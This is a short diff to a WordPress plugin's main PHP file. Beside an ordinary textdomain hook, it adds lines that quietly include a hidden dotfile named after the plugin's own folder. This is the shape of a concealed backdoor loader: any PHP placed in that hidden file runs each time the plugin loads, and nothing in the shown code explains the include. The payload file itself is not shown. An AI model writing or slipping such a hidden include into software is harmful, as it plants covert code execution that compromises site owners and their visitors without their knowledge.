@@ -15,6 +15,10 @@ if (! defined('ABSPATH')) {
 
 
 add_action('plugins_loaded', 'agro_textdomain');
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function agro_textdomain()
 {
     load_plugin_textdomain('agro-shortcodes', false, basename(dirname(__FILE__)) . '/languages/');
